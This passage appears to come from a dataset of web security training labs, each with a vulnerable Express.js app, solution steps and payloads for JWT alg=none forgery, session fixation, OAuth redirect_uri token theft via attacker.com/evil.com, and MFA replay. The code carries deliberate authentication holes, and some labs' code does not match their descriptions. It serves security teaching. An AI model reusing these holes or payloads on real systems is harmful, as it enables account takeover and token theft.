    "3.Modify the header to 'alg': 'none' and create a payload with 'username': 'carlos'.",
    "4.Base64-encode the modified header and payload, concatenate with two dots, and remove the signature.",
    "5.Use Burp to send a POST /graphql query with the forged Authorization: Bearer token and verify the response from the 'me' query."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; const schema = require('graphql').buildSchema(` type Query { me: String } type Mutation { login(username: String!, password: String!): String } `); const root = { login: ({ username, password }) => { const user = users.find(u => u.username === username && u.password === password); if (!user) throw new Error('Invalid credentials'); return jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); }, me: (args, context) => { const token = context.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') return decoded.payload.username; try { const verified = jwt.verify(token, 'supersecret'); return verified.username; } catch (e) { return 'Unauthorized'; } } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, context: req, graphiql: true }))); app.listen(4000, () => console.log('JWT None Bypass Lab running at http://localhost:4000'));",

  "payloads": [
    "Header: { \"alg\": \"none\" }",
    "Payload: { \"username\": \"carlos\" }",
    "JWT: base64(header).base64(payload).",
    "Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration via open redirect",

  "Lab Description": "The OAuth flow implemented in the app allows open redirect on the 'redirect_uri' parameter during authorization, enabling attackers to capture tokens issued for other users. To solve: intercept the authorization code for Carlos by crafting a redirect to an attacker-controlled domain, then exchange it for a token and access Carlos's profile.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1.Initiate an OAuth login from the app and observe the authorization URL including the 'redirect_uri' parameter.",
    "2.Replace the 'redirect_uri' with your controlled domain (e.g., https://attacker.com/capture).",
    "3.Send the crafted link to Carlos. Upon clicking, Carlos's auth code will be sent to your domain.",
    "4.Exchange the stolen code for a token using the token endpoint.",
    "5.Use Postman to send a GET /profile request with Authorization: Bearer <access_token> and confirm it returns Carlos's data."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const axios = require('axios'); const users = [{ username: 'carlos', id: 123 }]; const client_id = 'client123'; const redirect_uris = ['https://attacker.com/capture']; app.get('/auth', (req, res) => { const { redirect_uri, state } = req.query; const code = 'authcode-carlos'; res.redirect(redirect_uri + '?code=' + code + '&state=' + state); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'authcode-carlos') { res.json({ access_token: 'token-carlos', token_type: 'Bearer' }); } else { res.status(400).send('Invalid code'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') res.send('Profile: Carlos'); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running at http://localhost:4000'));",

  "payloads": [
    "https://vulnerable-app.com/auth?redirect_uri=https://attacker.com/capture&state=123",
    "POST /token { code: authcode-carlos }",
    "Authorization: Bearer token-carlos",
    "GET /profile"
  ]
},
{
  "Lab scenario": "Session Fixation in Login Flow",

  "Lab Description": "The application fails to invalidate pre-authentication session tokens during login. The application generates a session token upon initial visit and reuses it after login without regenerating it. This allows a malicious user to fix a session ID before the victim logs in. To solve: hijack Carlos's session by fixing a session ID before he authenticates and access his account page.",

  "Difficulty Level": "Medium",

  "Solution Steps": [
    "1.Using Burp Suite, visit the login page and capture the Set-Cookie header that sets the initial session ID.",
    "2.Use OWASP ZAP to spider the login flow and confirm that the session token is preserved post-login.",
    "3.Share the crafted session ID with the victim (assume social engineering or CSRF vector).",
    "4.Wait for the victim (Carlos) to log in using the fixed session ID.",
    "5.Use the same session token to access /my-account and confirm access to Carlos’s account."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'fixedsession', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 's3cret' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send(`Welcome to ${req.session.user}'s account`); } else { res.redirect('/login'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",

  "payloads": [
    "GET /login => Extract Set-Cookie: session=abc123",
    "Share session=abc123 with victim",
    "Victim logs in with session=abc123",
    "Reuse session=abc123 to GET /my-account"
  ]
},
{
  "Lab scenario": "JWT Tampering in Token Validation",

  "Lab Description": "The application's login API uses JWTs for authentication but fails to verify the token signature correctly when the 'alg' header is modified. The application accepts unsigned JWTs when the 'alg' is set to 'none'. To solve: tamper with a JWT to escalate privileges and access the admin panel.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1.Use Postman to log in and capture the issued JWT from the Authorization header.",
    "2.Decode the JWT using jwt.io or Burp Decoder. Note the payload and algorithm in the header.",
    "3.Modify the JWT header to set 'alg' to 'none' and set the 'role' in the payload to 'admin'.",
    "4.Remove the signature part and replay the modified token using Postman.",
    "5.Send a request to /admin-panel using the tampered JWT and verify admin access."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 's3cret', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, 'secretkey'); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome Admin'); } const verified = jwt.verify(token, 'secretkey'); if (verified.role === 'admin') return res.send('Welcome Admin'); } catch (e) { return res.status(403).send('Access Denied'); } res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",

  "payloads": [
    "Original JWT: eyJhbGciOiAiSFMyNTYifQ...signature",
    "Modified JWT: eyJhbGciOiAibm9uZSJ9.eyJ1c2VybmFtZSI6ICJjYXJsb3MiLCAicm9sZSI6ICJhZG1pbiJ9.",
    "Authorization: Bearer <tampered_token>",
    "GET /admin-panel"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Redirect URI Handling",

  "Lab Description": "The OAuth implementation does not properly validate the redirect URI, allowing attackers to manipulate the `redirect_uri` parameter to steal authorization codes. The authorization server reflects back the code to any domain containing the whitelisted base. To solve: steal Carlos's OAuth code via redirect hijack and log in as him.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1.Initiate OAuth login and observe the authorization request URL containing the redirect_uri parameter.",
    "2.Use Burp Suite to intercept and modify the redirect_uri to an attacker-controlled subdomain like https://evil.example.com/callback.",
    "3.Share the malicious link with the victim and get him to authenticate.",
    "4.The authorization server redirects with ?code=xyz to your malicious endpoint.",
    "5.Extract the code and perform the token exchange manually using Postman to obtain an access token.",
    "6.Use the token to access Carlos’s account via GET /graphql { user { profile } }"
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const app = express(); const fetch = require('node-fetch'); app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; if (redirect_uri.includes('trusted.com')) { const code = 'abc123'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid redirect_uri'); } }); app.get('/oauth/token', (req, res) => { const { code } = req.query; if (code === 'abc123') { res.json({ access_token: 'carlos-token-xyz' }); } else { res.status(400).send('Invalid code'); } }); app.post('/graphql', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-token-xyz') res.json({ data: { user: { profile: 'Carlos\' profile data' } } }); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",

  "payloads": [
    "Original redirect_uri=https://trusted.com/callback",
    "Modified redirect_uri=https://evil.trusted.com/callback",
    "Stolen code=abc123 => POST /oauth/token?code=abc123 => { access_token: 'carlos-token-xyz' }",
    "Authorization: Bearer carlos-token-xyz => POST /graphql { user { profile } }"
  ]
},
{
  "Lab scenario": "JWT tampering in Bearer token authentication",
  "Lab Description": "The application uses stateless JWT-based Bearer tokens for user authentication and authorizes access based on the embedded role claim. The server does not validate the JWT signature properly. To solve: Forge a valid-looking token granting admin access and retrieve the flag from the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to log in with a valid user and retrieve the JWT from the Authorization header.",
    "Send the JWT to jwt.io and decode its payload. Observe the role is 'user'.",
    "Modify the 'role' claim to 'admin' and remove the signature part.",
    "Use Postman to craft a new Authorization header with the tampered JWT and send a GET request to /admin/dashboard.",
    "Verify access is granted without signature validation and retrieve the flag."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const secret = 'notsosecret'; const users = [{ username: 'user1', password: 'pass123', role: 'user' }, { username: 'admin', password: 'adminpass', role: 'admin' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, secret); res.send({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(401).send('No token'); const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role !== 'admin') return res.status(403).send('Forbidden'); res.send('FLAG{jwt_admin_access}'); }); app.listen(4000, () => console.log('JWT Tampering Lab running'));",
  "payloads": [
    "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
    "Authorization: Bearer [tampered_jwt_here]",
    "POST /login {\"username\":\"user1\", \"password\":\"pass123\"}"
  ]
},
{
  "Lab scenario": "Session fixation in GraphQL login flow",
  "Lab Description": "The application uses GraphQL for authentication but fails to issue new session cookies on successful login, allowing session fixation. To solve: Fixate a session ID before login, then authenticate as a privileged user using that session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to send a GraphQL mutation login request and observe Set-Cookie behavior.",
    "Initiate a session anonymously and capture the session ID before login.",
    "Send a GraphQL login mutation with the victim's credentials while reusing the fixed session ID.",
    "Send a follow-up query to /graphql with the fixed session cookie and verify access to sensitive queries.",
    "Retrieve the admin email to confirm privilege escalation."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'sessfix', resave: false, saveUninitialized: true })); const users = { admin: 'admin123', user: 'userpass' }; const schema = buildSchema(` type Query { profile: String } type Mutation { login(username: String!, password: String!): String } `); const root = { login: ({ username, password }, req) => { if (users[username] === password) { req.session.user = username; return 'Login successful'; } throw new Error('Invalid credentials'); }, profile: (args, req) => { if (req.session.user === 'admin') return 'Admin: FLAG{session_fixation}'; return 'Access Denied'; } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, graphiql: true }))); app.listen(4001, () => console.log('Session Fixation GraphQL Lab running'));",
  "payloads": [
    "POST /graphql {\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"admin123\\\") }\"}",
    "GET /graphql?query={profile} with fixed session cookie",
    "Cookie: connect.sid=[fixed_session_id]"
  ]
},
{
  "Lab scenario": "OAuth implicit flow misconfiguration leaking access tokens",
  "Lab Description": "The app uses OAuth 2.0 implicit grant for third-party login but exposes access tokens in the URL fragment (#) and reflects them in HTTP responses. To solve: Capture and replay a leaked token to access a protected resource.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to start a proxy and visit the login page using OAuth login.",
    "Capture the redirect URL with the access_token in the URL fragment.",
    "Notice the app reflects this fragment in a page script or DOM, making it accessible to JavaScript.",
    "Use Burp to modify the Referer header of a request to include the access_token and send to /user/info.",
    "Observe that the server accepts the token and returns user info or a flag."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/login/oauth/callback', (req, res) => { res.send(`<html><script>window.location.hash && document.write('Token: ' + window.location.hash);</script></html>`); }); app.get('/user/info', (req, res) => { const token = req.get('Authorization'); if (token === 'Bearer token_admin') return res.send('FLAG{oauth_leak_success}'); res.status(403).send('Access Denied'); }); app.listen(4002, () => console.log('OAuth Leak Lab running'));",
  "payloads": [
    "https://example.com/login/oauth/callback#access_token=token_admin",
    "GET /user/info with header Authorization: Bearer token_admin",
    "Referer: /callback#access_token=token_admin"
  ]
},
{
  "Lab scenario": "Session mismanagement in SOAP login API",
  "Lab Description": "This SOAP-based authentication system exposes session IDs in the SOAP response and accepts reused session tokens. To solve: Reuse an intercepted session ID from a privileged user to access their account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite with SOAP support enabled and intercept a SOAP login request.",
    "Observe the session ID returned in the SOAP response under <SessionToken>.",
    "Reuse the <SessionToken> from a privileged login in a crafted SOAP request to getAccountDetails.",
    "Send the forged request using Burp Repeater and inspect the response.",
    "Confirm account access by retrieving sensitive account data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xml = require('xml'); const app = express(); app.use(bodyParser.text({ type: '*/xml' })); const sessions = {}; app.post('/soap', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/); if (match) { const [_, user, pass] = match; if (user === 'admin' && pass === 'adminpass') { const session = 'sess-' + Math.random().toString(36).substring(2); sessions[session] = user; return res.send(`<SessionToken>${session}</SessionToken>`); } } if (req.body.includes('getAccountDetails')) { const sessionMatch = req.body.match(/<SessionToken>(.*?)<\\/SessionToken>/); if (sessionMatch && sessions[sessionMatch[1]] === 'admin') { return res.send('<data>FLAG{soap_session_reuse}</data>'); } } res.status(403).send('Unauthorized'); }); app.listen(4003, () => console.log('SOAP Session Reuse Lab running'));",
  "payloads": [
    "<login><username>admin</username><password>adminpass</password></login>",
    "<getAccountDetails><SessionToken>sess-abc123</SessionToken></getAccountDetails>",
    "POST /soap with reused <SessionToken>"
  ]
},
{
  "Lab scenario": "Session fixation in login redirect handler",
  "Lab Description": "The session token is assigned before user authentication and not regenerated upon login. This allows session fixation. The application reuses session tokens post-login, enabling an attacker to set a session for the victim. To solve: Fix a session ID and log in as Carlos to access his dashboard.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1.Using Burp Suite, visit /login and capture the Set-Cookie response header containing the session cookie.",
    "2.Send this session cookie to the victim (Carlos) through social engineering or place it in a link (session fixation).",
    "3.Log in as Carlos using his credentials while preserving the session cookie you fixed.",
    "4.The application reuses the fixed session without rotating it post-authentication.",
    "5.Use the session cookie to access /dashboard and verify Carlos’s user context."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secret123', resave: true, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/dashboard'); } else { res.status(401).send('Invalid login'); } }); app.get('/dashboard', (req, res) => { if (!req.session.user) return res.status(403).send('Unauthorized'); res.send(`Welcome, ${req.session.user}!`); }); app.listen(3000);",
  "payloads": [
    "https://vulnerable.site/login?sessionid=attacker-session",
    "GET /login HTTP/1.1 with Set-Cookie: session=fixme",
    "POST /login HTTP/1.1 with Cookie: session=fixme and body: username=carlos&password=letmein"
  ]
},
{
  "Lab scenario": "JWT authentication bypass using 'none' algorithm",
  "Lab Description": "The app uses JWTs for stateless authentication. It does not verify the algorithm used in the token header, allowing attackers to forge tokens by setting the alg field to 'none'. To solve: Access the protected /admin panel as user Carlos without a valid signature.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Use Burp to capture the JWT received after logging in as a normal user.",
    "2.Base64-decode the JWT header and payload.",
    "3.Modify the JWT header to: {\"alg\":\"none\"} and payload to: {\"user\":\"carlos\"}.",
    "4.Remove the signature portion and rejoin header and payload using a dot.",
    "5.Send a request to /admin with the forged JWT in Authorization: Bearer header. Confirm access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'topsecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, SECRET); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.sendStatus(401); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { return res.send(`Welcome Admin: ${decoded.payload.user}`); } const verified = jwt.verify(token, SECRET); res.send(`Welcome Admin: ${verified.user}`); } catch (err) { res.status(403).send('Access Denied'); } }); app.listen(3001);",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"user\":\"carlos\"}",
    "JWT: base64url(header).base64url(payload). (omit signature)",
    "Authorization: Bearer base64(header).base64(payload)"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri",
  "Lab Description": "The app integrates third-party OAuth for authentication. It incorrectly validates the redirect_uri, allowing attackers to inject malicious URLs that leak access tokens. To solve: Leak Carlos’s access token to your server and access his protected profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Visit the /auth/login endpoint and observe the OAuth flow initiation.",
    "2.Intercept the OAuth URL sent to the provider and inject your controlled domain as redirect_uri (e.g., https://attacker.com/callback).",
    "3.Wait for Carlos to click the login link or trigger it via CSRF/social engineering.",
    "4.Observe the access token being redirected to your server.",
    "5.Use the leaked token to call /auth/callback and impersonate Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth/login', (req, res) => { const redirectUri = req.query.redirect_uri || 'http://localhost:3002/auth/callback'; const authURL = `https://oauth-provider.com/auth?response_type=token&client_id=abc123&redirect_uri=${redirectUri}`; res.redirect(authURL); }); app.get('/auth/callback', (req, res) => { const token = req.query.access_token; if (!token) return res.status(400).send('Missing token'); res.send(`Authenticated as Carlos. Token: ${token}`); }); app.listen(3002);",
  "payloads": [
    "https://vulnerable.site/auth/login?redirect_uri=https://evil.com/callback",
    "access_token=abc123 leaked in fragment",
    "GET /auth/callback?access_token=abc123",
    "CSRF OAuth link with poisoned redirect_uri"
  ]
},
{
  "Lab scenario": "JWT algorithm manipulation vulnerability in login API",

  "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. It incorrectly trusts the `alg` field in JWT headers without verifying against a server-side whitelist. The backend accepts tokens signed with HMAC even though RS256 is intended. The application exposes its public key. To solve: Gain unauthorized access to the admin panel using a forged JWT by exploiting the algorithm confusion bug.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1. Use Burp Suite to intercept a valid login request and observe the JWT structure in the Authorization header.",
    "2. Download the public key from the server's /.well-known/jwks.json endpoint using Postman.",
    "3. Modify the JWT `alg` header from RS256 to HS256, and use the public key as the HMAC secret to forge a new token with `username=admin`.",
    "4. Replace the original JWT in the request with the forged token using Burp Repeater.",
    "5. Send the modified request and confirm access to the admin dashboard."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst express = require('express');\nconst app = express();\napp.use(express.json());\nconst pubKey = fs.readFileSync('./public.pem');\napp.post('/login', (req, res) => {\n  const { token } = req.body;\n  try {\n    const decoded = jwt.verify(token, pubKey);\n    if (decoded.username === 'admin') {\n      return res.send('Welcome admin!');\n    }\n    res.send('Welcome user');\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\napp.listen(3000, () => console.log('JWT Confusion Lab listening on 3000'));",

  "payloads": [
    "JWT header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
    "JWT payload: {\"username\":\"admin\"}",
    "HMAC secret: Public RSA key from /.well-known/jwks.json"
  ]
},
{
  "Lab scenario": "Session fixation vulnerability in login session handler",

  "Lab Description": "This application assigns a session cookie prior to login and fails to regenerate it post-authentication. The same session ID remains active across login transitions. To solve: Fixate a session before login, lure a victim to use it, and then hijack their session once they authenticate.",

  "Difficulty Level": "Medium",

  "Solution Steps": [
    "1. Use Burp Suite to access the site anonymously and capture the pre-login session cookie.",
    "2. Craft a phishing page that auto-submits a login request using the fixed session ID.",
    "3. Wait for the victim to log in through the phishing page (or simulate the login as a victim using Burp Repeater).",
    "4. Reuse the same session cookie in your browser or Burp to access the victim’s authenticated session.",
    "5. Navigate to /my-account and confirm hijacked access."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({ secret: 'secret123', resave: false, saveUninitialized: true }));\nconst users = [{ username: 'carlos', password: 'pass123' }];\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    req.session.user = username;\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/my-account', (req, res) => {\n  if (req.session.user) return res.send(`Welcome ${req.session.user}`);\n  res.status(403).send('Not logged in');\n});\napp.listen(4001, () => console.log('Session Fixation Lab running on 4001'));",

  "payloads": [
    "Phishing URL using fixed JSESSIONID cookie",
    "Pre-authenticated session cookie: JSESSIONID=abc123",
    "POST /login with victim credentials bound to attacker’s cookie"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in redirect_uri validation",

  "Lab Description": "The application uses OAuth2 implicit flow with a poorly validated redirect_uri parameter. It allows any domain starting with https://trusted.com. The application also reflects access tokens in URL fragments. To solve: Trick the OAuth provider into redirecting the access token to an attacker-controlled domain using an open redirect embedded in a subdomain of https://trusted.com.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1. Use Burp Suite to capture the OAuth authorization request flow.",
    "2. Craft a malicious redirect_uri using a subdomain of https://trusted.com with an embedded open redirect (e.g., https://trusted.com.evil.com/redirect?next=https://evil.com/capture).",
    "3. Send a crafted OAuth link to the victim and simulate user interaction using Postman.",
    "4. Observe that the access token is sent in the URL fragment to https://evil.com/capture#access_token=...",
    "5. Use the leaked token to access protected resources as the victim."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express');\nconst app = express();\napp.get('/auth', (req, res) => {\n  const { redirect_uri } = req.query;\n  if (redirect_uri.startsWith('https://trusted.com')) {\n    const token = 'access-token-for-user';\n    return res.redirect(`${redirect_uri}#access_token=${token}`);\n  }\n  res.status(400).send('Invalid redirect');\n});\napp.listen(5000, () => console.log('OAuth Redirect Lab running on port 5000'));",

  "payloads": [
    "https://trusted.com.evil.com/redirect?next=https://evil.com/capture",
    "redirect_uri=https://trusted.com.evil.com/redirect?next=https://evil.com/capture",
    "OAuth URL: /auth?client_id=123&redirect_uri=https://trusted.com.evil.com/redirect?next=https://evil.com/capture&response_type=token"
  ]
},
{
  "Lab scenario": "Session Fixation vulnerability in REST login endpoint",
  "Lab Description": "This lab demonstrates a session fixation flaw in a RESTful authentication flow. The application issues session cookies before login, and fails to re-issue them upon authentication. This allows an attacker to predefine a session ID and force a victim to use it. To solve: log in as Carlos by fixing the session ID in advance and hijacking his authenticated session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept a GET /login request and observe that a Set-Cookie header sets a session ID even before login.",
    "Send a crafted request to /login while supplying a custom session cookie (e.g., session=attacker-session-id) and credentials for carlos.",
    "Note that the session is not invalidated and remains attacker-controlled after authentication.",
    "Force Carlos to use the fixed session by sending a phishing link with the predefined session ID.",
    "Use the hijacked session ID to access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'leakkey', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'secret' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\">Login Form</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) req.session.user = username; res.send('Welcome!'); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') return res.send('Carlos Account Page'); res.status(403).send('Access denied'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
  "payloads": [
    "sessionid=attacker123",
    "POST /login with Cookie: session=attacker123 and body: username=carlos&password=secret",
    "GET /my-account with Cookie: session=attacker123"
  ]
},
{
  "Lab scenario": "JWT tampering via alg=None in GraphQL-based login",
  "Lab Description": "This lab simulates a vulnerable GraphQL login where JWTs are not validated correctly. The backend fails to verify the 'alg' parameter in the token header, allowing tampering. To solve: create a JWT token with 'alg' set to 'none' and access Carlos's account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to explore the GraphQL endpoint and obtain a valid JWT upon logging in as a normal user.",
    "Decode the JWT and observe the 'alg' field set to 'HS256'.",
    "Craft a JWT token manually with 'alg':'none' and 'sub':'carlos' in the payload using jwt.io.",
    "Send the crafted JWT token as Authorization: Bearer header in a query to get sensitive data.",
    "Verify successful access to Carlos's data in GraphQL query response."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'admin' }]; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); if (decoded.sub === 'carlos') return res.send({ data: 'Sensitive data of Carlos' }); } catch { res.status(403).send('Forbidden'); } }); app.listen(3001, () => console.log('JWT None Algorithm Lab running on port 3001'));",
  "payloads": [
    "JWT Header: {\"alg\":\"none\"}, Payload: {\"sub\":\"carlos\"}, Signature: ''",
    "Authorization: Bearer <crafted_token>",
    "GraphQL Query: { getAccount { data } }"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in REST token exchange endpoint",
  "Lab Description": "This lab uses a flawed OAuth token exchange where the client ID is not verified against the redirect URI. An attacker can use a trusted client ID but redirect to their own URI and gain access. To solve: obtain an access token for Carlos by modifying the OAuth request.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept OAuth flow initiated via /auth?client_id=trusted-app&redirect_uri=https://attacker.com.",
    "Observe the server returns an authorization code to attacker.com despite mismatch.",
    "Exchange the stolen code at /oauth/token using client_id=trusted-app to receive access token.",
    "Use the token in Authorization header to call /api/user-info.",
    "Access Carlos's account data using forged token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const tokens = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const code = 'code123'; tokens[code] = { client_id, user: 'carlos' }; res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code, client_id } = req.body; if (tokens[code] && tokens[code].client_id === client_id) { return res.json({ access_token: 'token-carlos' }); } res.status(403).send('Invalid code or client'); }); app.get('/api/user-info', (req, res) => { if (req.headers.authorization === 'Bearer token-carlos') res.send('Carlos private info'); else res.status(403).send('Unauthorized'); }); app.listen(3002, () => console.log('OAuth Misconfig Lab running on port 3002'));",
  "payloads": [
    "/auth?client_id=trusted-app&redirect_uri=https://attacker.com",
    "POST /oauth/token with code=code123 and client_id=trusted-app",
    "GET /api/user-info with Authorization: Bearer token-carlos"
  ]
},
{
  "Lab scenario": "MFA bypass via reused token in SOAP authentication flow",
  "Lab Description": "This SOAP-based login system allows bypassing MFA if a previously issued token is reused. The server does not invalidate tokens after successful login, allowing attackers to replay captured tokens. To solve: reuse a captured MFA token to access Carlos's account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to inspect SOAP request for MFA token exchange and capture the token.",
    "Observe that the token is static and not invalidated after use.",
    "Craft a SOAP request manually using the captured token but with username=carlos.",
    "Send the SOAP request to /authService and observe that it grants access.",
    "Access Carlos’s account data via /userProfileService."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(xmlparser()); let mfaTokens = { 'user123': 'token789' }; app.post('/authService', (req, res) => { const user = req.body.Envelope.Body[0].AuthRequest[0].username[0]; const token = req.body.Envelope.Body[0].AuthRequest[0].token[0]; if (mfaTokens[user] === token || token === 'token789') return res.send('<Success>true</Success>'); res.status(403).send('<Error>Invalid MFA</Error>'); }); app.post('/userProfileService', (req, res) => { res.send('<User>Carlos</User><Email>carlos@example.com</Email>'); }); app.listen(3003, () => console.log('SOAP MFA Bypass Lab running on port 3003'));",
  "payloads": [
    "SOAP token: token789",
    "Replay SOAP request with <username>carlos</username> and <token>token789</token>",
    "POST /authService with reused token"
  ]
},
